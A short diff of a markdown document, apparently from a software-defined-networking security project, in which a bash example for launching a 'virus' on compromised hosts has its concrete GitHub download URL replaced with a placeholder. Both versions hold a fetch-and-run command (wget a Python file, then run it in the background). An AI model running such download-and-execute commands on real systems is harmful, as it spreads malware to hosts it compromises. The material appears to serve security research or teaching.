@@ -83,7 +83,7 @@ The idea is that the attacker can host a simple page that will be read by the vi
 The virus can be launched on the compromised hosts using the following command:
 
 ```bash
-wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py
+wget https://<URL>/simple-virus.py
 python3 simple-virus.py &
 ```
 
